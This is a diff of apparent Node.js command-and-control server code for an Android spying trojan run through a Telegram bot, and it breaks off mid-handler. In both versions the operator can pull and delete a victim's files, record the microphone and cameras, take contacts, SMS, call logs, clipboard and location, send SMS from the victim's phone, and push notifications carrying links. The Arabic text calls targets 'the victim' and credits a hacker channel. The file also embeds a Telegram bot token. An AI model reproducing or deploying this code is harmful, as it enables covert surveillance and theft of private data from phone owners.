@@ -1,362 +1,730 @@
 const express = require('express');
-const WebSocket = require('ws');
-const http = require('http');
-const TelegramBot = require('node-telegram-bot-api');
-const { v4: uuidv4 } = require('uuid');
+const webSocket = require('ws');
+const http = require('http')
+const telegramBot = require('node-telegram-bot-api')
+const uuid4 = require('uuid')
 const multer = require('multer');
-const bodyParser = require('body-parser');
+const bodyParser = require('body-parser')
 const axios = require("axios");
 
-// بيانات التكوين - تأكد من صحتها
-const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
-const ADMIN_ID = '5474851558';
-const PING_URL = 'https://www.google.com';
+const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o'
+const id = '5474851558'
+const address = 'https://www.google.com'
 
-// تهيئة التطبيقات
 const app = express();
 const appServer = http.createServer(app);
-const appSocket = new WebSocket.Server({ server: appServer });
-const appBot = new TelegramBot(token, { polling: true });
+const appSocket = new webSocket.Server({server: appServer});
+const appBot = new telegramBot(token, {polling: true});
+const appClients = new Map()
 
-// ✅ قاعدة بيانات موحدة: ربط رمز الجلسة بجميع بيانات الاتصال
-const appSessions = new Map(); 
-// الهيكل: sessionToken = { ws: اتصال السوكت, model: "...", battery: "...", ... }
-
-// إعدادات الوسائط والتحليل
 const upload = multer();
 app.use(bodyParser.json());
 
-// متغيرات التتبع
-let currentSessionToken = '';
-let currentNumber = '';
-let currentTitle = '';
+let currentUuid = ''
+let currentNumber = ''
+let currentTitle = ''
 
-// الصفحة الرئيسية
-app.get('/', (req, res) => {
-    res.send('<h1 align="center">تم تشغيل الخادم بنجاح - نظام الجلسات الموحد مفعل</h1>');
-});
+app.get('/', function (req, res) {
+    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  الهاكر بدر الضامئ قناة المطور @HACKERBADR</h1>')
+})
 
-// ✅ استقبال الملفات من التطبيق مع ربطها بالجلسة
 app.post("/uploadFile", upload.single('file'), (req, res) => {
-    try {
-        // استخراج رمز الجلسة من الترويسة (يجب أن يرسلها التطبيق باسم X-Session-Token)
-        const sessionToken = req.headers['x-session-token'];
-        if (!sessionToken || !appSessions.has(sessionToken)) {
-            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
-        }
-
-        const sessionData = appSessions.get(sessionToken);
-        const fileName = req.file.originalname;
-        
-        appBot.sendDocument(ADMIN_ID, req.file.buffer, {
-            caption: `°• ملف مرفوع من جهاز: <b>${sessionData.model}</b>`,
+    const name = req.file.originalname
+    appBot.sendDocument(id, req.file.buffer, {
+            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
             parse_mode: "HTML"
-        }, {
-            filename: fileName,
-            contentType: req.file.mimetype || 'application/octet-stream'
-        });
-        res.status(200).send('تم الاستلام');
-    } catch (err) {
-        console.error("خطأ في استقبال الملف:", err);
-        res.status(500).send('خطأ في المعالجة');
-    }
-});
-
-// ✅ استقبال النصوص من التطبيق مع ربطها بالجلسة
+        },
+        {
+            filename: name,
+            contentType: 'application/txt',
+        })
+    res.send('')
+})
 app.post("/uploadText", (req, res) => {
-    try {
-        const sessionToken = req.headers['x-session-token'];
-        if (!sessionToken || !appSessions.has(sessionToken)) {
-            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
-        }
-
-        const sessionData = appSessions.get(sessionToken);
-        appBot.sendMessage(ADMIN_ID, 
-            `°• رسالة من جهاز: <b>${sessionData.model}</b>\n\n${req.body.text}`, 
-            { parse_mode: "HTML" }
-        );
-        res.status(200).send('تم الاستلام');
-    } catch (err) {
-        console.error("خطأ في استقبال النص:", err);
-        res.status(500).send('خطأ في المعالجة');
-    }
-});
-
-// ✅ استقبال الموقع من التطبيق مع ربطه بالجلسة
+    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
+    res.send('')
+})
 app.post("/uploadLocation", (req, res) => {
-    try {
-        const sessionToken = req.headers['x-session-token'];
-        if (!sessionToken || !appSessions.has(sessionToken)) {
-            return res.status(401).send('خطأ: رمز الجلسة غير صالح أو منتهي الصلاحية');
-        }
+    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
+    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
+    res.send('')
+})
 
-        const sessionData = appSessions.get(sessionToken);
-        const { lat, lon } = req.body;
-        
-        appBot.sendLocation(ADMIN_ID, lat, lon);
-        appBot.sendMessage(ADMIN_ID, 
-            `°• موقع من جهاز: <b>${sessionData.model}</b>`, 
-            { parse_mode: "HTML" }
-        );
-        res.status(200).send('تم الاستلام');
-    } catch (err) {
-        console.error("خطأ في استقبال الموقع:", err);
-        res.status(500).send('خطأ في المعالجة');
-    }
-});
-
-// ✅ معالجة اتصالات السوكت وإنشاء رمز الجلسة الموحد
+// ✅ تم إصلاح السوكت هنا وإضافة استقبال الردود
 appSocket.on('connection', (ws, req) => {
-    // استخراج رمز الجلسة المرسل من التطبيق عند الاتصال
-    const clientSessionToken = req.headers['x-session-token'] || uuidv4();
-    const deviceData = {
-        sessionToken: clientSessionToken,
-        model: req.headers.model || "غير معروف",
-        battery: req.headers.battery || "غير معروف",
-        version: req.headers.version || "غير معروف",
-        brightness: req.headers.brightness || "غير معروف",
-        provider: req.headers.provider || "غير معروف",
-        ws: ws
-    };
+    const uuid = uuid4.v4()
+    const model = req.headers.model
+    const battery = req.headers.battery
+    const version = req.headers.version
+    const brightness = req.headers.brightness
+    const provider = req.headers.provider
 
-    // حفظ الجلسة في القاعدة الموحدة
-    ws.sessionToken = clientSessionToken;
-    appSessions.set(clientSessionToken, deviceData);
-
-    // إشعار بجهاز جديد
-    appBot.sendMessage(ADMIN_ID,
+    ws.uuid = uuid
+    appClients.set(uuid, {
+        model: model,
+        battery: battery,
+        version: version,
+        brightness: brightness,
+        provider: provider
+    })
+    appBot.sendMessage(id,
         `°• جهاز جديد متصل\n\n` +
-        `• الموديل: <b>${deviceData.model}</b>\n` +
-        `• مستوى البطارية: <b>${deviceData.battery}%</b>\n` +
-        `• إصدار النظام: <b>${deviceData.version}</b>\n` +
-        `• سطوع الشاشة: <b>${deviceData.brightness}%</b>\n` +
-        `• مزود الخدمة: <b>${deviceData.provider}</b>\n` +
-        `• رمز الجلسة: <code>${clientSessionToken}</code>`,
-        { parse_mode: "HTML" }
-    );
+        `• موديل الجهاز : <b>${model}</b>\n` +
+        `• البطارية : <b>${battery}</b>\n` +
+        `• نظام الاندرويد : <b>${version}</b>\n` +
+        `• سطوح الشاشة : <b>${brightness}</b>\n` +
+        `• مزود : <b>${provider}</b>`,
+        {parse_mode: "HTML"}
+    )
 
-    // استقبال أي رد من التطبيق وإرساله للبوت
+    // ✅ استقبال أي رد من التطبيق وإرساله للبوت مباشرة
     ws.on('message', (message) => {
-        try {
-            const response = message.toString();
-            appBot.sendMessage(ADMIN_ID,
-                `°• رد من الجهاز <b>${deviceData.model}</b>:\n\n${response}`,
-                { parse_mode: "HTML" }
-            );
-        } catch (err) {
-            console.error("خطأ في معالجة رسالة السوكت:", err);
-        }
+        const response = message.toString();
+        appBot.sendMessage(id, `°• رد من الجهاز <b>${model}</b>:\n\n${response}`, {parse_mode: "HTML"});
     });
 
-    // معالجة قطع الاتصال
-    ws.on('close', () => {
-        if (appSessions.has(clientSessionToken)) {
-            const disconnected = appSessions.get(clientSessionToken);
-            appBot.sendMessage(ADMIN_ID,
-                `°• تم قطع اتصال الجهاز\n\n` +
-                `• الموديل: <b>${disconnected.model}</b>\n` +
-                `• رمز الجلسة: <code>${clientSessionToken}</code>`,
-                { parse_mode: "HTML" }
-            );
-            appSessions.delete(clientSessionToken);
-        }
-    });
+    ws.on('close', function () {
+        appBot.sendMessage(id,
+            `°• لا يوجد جهاز متصل\n\n` +
+            `• موديل الجهاز : <b>${model}</b>\n` +
+            `• البطارية : <b>${battery}</b>\n` +
+            `• نظام الاندرويد : <b>${version}</b>\n` +
+            `• سطوح الشاشة : <b>${brightness}</b>\n` +
+            `• مزود : <b>${provider}</b>`,
+            {parse_mode: "HTML"}
+        )
+        appClients.delete(ws.uuid)
+    })
+})
 
-    ws.on('error', () => appSessions.delete(clientSessionToken));
-});
-
-// معالجة أوامر البوت
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
-    if (chatId != ADMIN_ID) return appBot.sendMessage(chatId, '°• طلب الوصول مرفوض');
-
-    if (message.reply_to_message) return handleReplies(message);
-
-    switch (message.text) {
-        case '/start':
-            appBot.sendMessage(ADMIN_ID,
-                '°• مرحباً بك في نظام التحكم بالجلسات الموحدة\n\n' +
-                '• جميع الطلبات الآن مرتبطة ببعضها عبر رمز جلسة ثابت\n' +
-                '• لا يوجد تعارض أو فقدان للبيانات',
-                { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true }, parse_mode: "HTML" }
-            );
-            break;
-
-        case 'الأجهزة المتصلة':
-            if (appSessions.size === 0) {
-                appBot.sendMessage(ADMIN_ID, '°• لا توجد أجهزة متصلة حالياً');
+    if (message.reply_to_message) {
+        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
+            currentNumber = message.text
+            appBot.sendMessage(id,
+                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
+                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+                {reply_markup: {force_reply: true}}
+            )
+        }
+        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`send_message:${currentNumber}/${message.text}`)
+                }
+            });
+            currentNumber = ''
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
+            const message_to_all = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`send_message_to_all:${message_to_all}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
+            const path = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`file:${path}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
+            const path = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`delete_file:${path}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`microphone:${duration}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`rec_camera_main:${duration}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`rec_camera_selfie:${duration}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
+            const toastMessage = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`toast:${toastMessage}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
+            const notificationMessage = message.text
+            currentTitle = notificationMessage
+            appBot.sendMessage(id,
+                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
+                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
+                {reply_markup: {force_reply: true}}
+            )
+        }
+        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
+            const link = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`show_notification:${currentTitle}/${link}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
+            const audioLink = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`play_audio:${audioLink}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+    }
+    if (id == chatId) {
+        if (message.text == '/start') {
+            appBot.sendMessage(id,
+                '°• مرحبا بكم في بوت الاختراق مطور البوت الهاكر بدر الضامئ قناة المطور @HACKERBADR\n\n' +
+                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
+                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر\n\n' +
+                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n' +
+                '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
+        if (message.text == 'الاجهزة المتصلة') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                )
             } else {
-                let list = '°• قائمة الأجهزة والجلسات:\n\n';
-                appSessions.forEach(data => {
-                    list += `• الموديل: <b>${data.model}</b>\n` +
-                            `• رمز الجلسة: <code>${data.sessionToken}</code>\n\n`;
-                });
-                appBot.sendMessage(ADMIN_ID, list, { parse_mode: "HTML" });
+                let text = '°• قائمة الاجهزة المتصلة :\n\n'
+                appClients.forEach(function (value, key, map) {
+                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
+                        `• البطارية : <b>${value.battery}</b>\n` +
+                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
+                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
+                        `• مزود : <b>${value.provider}</b>\n\n`
+                })
+                appBot.sendMessage(id, text, {parse_mode: "HTML"})
             }
-            break;
-
-        case 'تنفيذ أمر':
-            if (appSessions.size === 0) {
-                appBot.sendMessage(ADMIN_ID, '°• لا توجد أجهزة متصلة');
+        }
+        if (message.text == 'تنفيذ الامر') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                )
             } else {
-                const keyboard = [];
-                appSessions.forEach(data => {
-                    keyboard.push([{ text: data.model, callback_data: `device:${data.sessionToken}` }]);
-                });
-                appBot.sendMessage(ADMIN_ID, '°• اختر الجهاز:', { reply_markup: { inline_keyboard: keyboard } });
+                const deviceListKeyboard = []
+                appClients.forEach(function (value, key, map) {
+                    deviceListKeyboard.push([{
+                        text: value.model,
+                        callback_data: 'device:' + key
+                    }])
+                })
+                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
+                    "reply_markup": {
+                        "inline_keyboard": deviceListKeyboard,
+                    },
+                })
             }
-            break;
-    }
-});
-
-// دالة معالجة الردود
-function handleReplies(message) {
-    const replyText = message.reply_to_message.text;
-    const userText = message.text;
-
-    if (replyText.includes('اكتب رقم الهاتف')) {
-        currentNumber = userText;
-        appBot.sendMessage(ADMIN_ID, '°• اكتب الرسالة المراد إرسالها:', { reply_markup: { force_reply: true } });
-    }
-    else if (replyText.includes('اكتب الرسالة المراد إرسالها من الجهاز')) {
-        sendToDevice(`send_message:${currentNumber}/${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('رسالة لجميع الأرقام')) {
-        sendToDevice(`send_message_to_all:${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('مسار الملف المراد سحبه')) {
-        sendToDevice(`file:${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('مسار الملف المراد حذفه')) {
-        sendToDevice(`delete_file:${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('مدة التسجيل الصوتي')) {
-        sendToDevice(`microphone:${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('رسالة التنبيه الظاهرة')) {
-        sendToDevice(`toast:${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('عنوان الإشعار')) {
-        currentTitle = userText;
-        appBot.sendMessage(ADMIN_ID, '°• اكتب الرابط المراد فتحه:', { reply_markup: { force_reply: true } });
-    }
-    else if (replyText.includes('الرابط المراد فتحه')) {
-        sendToDevice(`show_notification:${currentTitle}/${userText}`);
-        resetVariables();
-    }
-    else if (replyText.includes('رابط الملف الصوتي')) {
-        sendToDevice(`play_audio:${userText}`);
-        resetVariables();
-    }
-}
-
-// دالة إرسال الأوامر للجهاز
-function sendToDevice(command) {
-    if (!currentSessionToken || !appSessions.has(currentSessionToken)) {
-        return appBot.sendMessage(ADMIN_ID, '°• خطأ: الجلسة غير موجودة');
-    }
-    const session = appSessions.get(currentSessionToken);
-    if (session.ws.readyState === WebSocket.OPEN) {
-        session.ws.send(command);
-        appBot.sendMessage(ADMIN_ID, '°• تم إرسال الأمر بنجاح', { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true } });
+        }
     } else {
-        appBot.sendMessage(ADMIN_ID, '°• خطأ: الاتصال مغلق');
+        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
     }
-}
-
-function resetVariables() {
-    currentSessionToken = currentNumber = currentTitle = '';
-}
-
-// معالجة النقرات على الأزرار
-appBot.on("callback_query", (query) => {
-    const { message, data } = query;
-    const [action, sessionToken] = data.split(':');
-
-    if (!appSessions.has(sessionToken)) {
-        return appBot.answerCallbackQuery(query.id, { text: 'الجلسة منتهية' });
+})
+appBot.on("callback_query", (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data
+    const commend = data.split(':')[0]
+    const uuid = data.split(':')[1]
+    console.log(uuid)
+    if (commend == 'device') {
+        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+            width: 10000,
+            chat_id: id,
+            message_id: msg.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
+                        {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
+                    ],
+                    [
+                        {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
+                        {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
+                    ],
+                    [
+                        {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
+                        {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`}
+                    ],
+                    [
+                        {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
+                        {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
+                    ],
+                    [
+                        {text: '🚩الموقع', callback_data: `location:${uuid}`},
+                        {text: '👹نخب', callback_data: `toast:${uuid}`}
+                    ],
+                    [
+                        {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
+                        {text: '👤جهات الاتصال', callback_data: `contacts:${uuid}`}
+                    ],
+                    [
+                        {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
+                        {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
+                    ],
+                    [
+                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
+                        {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
+                    ],
+                    [
+                        {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
+                        {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`}
+                    ],
+                    [
+                        {
+                            text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
+                            callback_data: `send_message_to_all:${uuid}`
+                        }
+                    ],
+                ]
+            },
+            parse_mode: "HTML"
+        })
     }
-
-    if (action === 'device') {
-        appBot.editMessageText(`°• تحكم في الجهاز: <b>${appSessions.get(sessionToken).model}</b>`, {
-            chat_id: ADMIN_ID, message_id: message.message_id, parse_mode: "HTML",
-            reply_markup: { inline_keyboard: [
-                [{text: '📱 التطبيقات', callback_data: `apps:${sessionToken}`}, {text: '📲 معلومات الجهاز', callback_data: `device_info:${sessionToken}`}],
-                [{text: '📂 سحب ملف', callback_data: `file:${sessionToken}`}, {text: '🗑️ حذف ملف', callback_data: `delete_file:${sessionToken}`}],
-                [{text: '📃 الحافظة', callback_data: `clipboard:${sessionToken}`}, {text: '🎤 الميكروفون', callback_data: `microphone:${sessionToken}`}],
-                [{text: '📷 الكاميرا الأمامية', callback_data: `camera_main:${sessionToken}`}, {text: '📸 الكاميرا الخلفية', callback_data: `camera_selfie:${sessionToken}`}],
-                [{text: '📍 الموقع', callback_data: `location:${sessionToken}`}, {text: '💬 تنبيه نصي', callback_data: `toast:${sessionToken}`}],
-                [{text: '☎️ المكالمات', callback_data: `calls:${sessionToken}`}, {text: '👤 جهات الاتصال', callback_data: `contacts:${sessionToken}`}],
-                [{text: '📳 اهتزاز', callback_data: `vibrate:${sessionToken}`}, {text: '🔔 إشعار', callback_data: `show_notification:${sessionToken}`}],
-                [{text: '📨 الرسائل', callback_data: `messages:${sessionToken}`}, {text: '✉️ إرسال رسالة', callback_data: `send_message:${sessionToken}`}],
-                [{text: '🔊 تشغيل صوت', callback_data: `play_audio:${sessionToken}`}, {text: '✉️ إرسال للجميع', callback_data: `send_message_to_all:${sessionToken}`}]
-            ]}
+    if (commend == 'calls') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('calls');
+            }
         });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (['calls','contacts','messages','apps','device_info','clipboard','camera_main','camera_selfie','location','vibrate','stop_audio'].includes(action)) {
-        const session = appSessions.get(sessionToken);
-        if (session.ws.readyState === WebSocket.OPEN) session.ws.send(action);
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• جاري التنفيذ...', { reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]], resize_keyboard: true } });
+    if (commend == 'contacts') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('contacts');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'send_message') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• اكتب رقم الهاتف:', { reply_markup: { force_reply: true } });
+    if (commend == 'messages') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('messages');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'send_message_to_all') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• اكتب الرسالة:', { reply_markup: { force_reply: true } });
+    if (commend == 'apps') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('apps');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
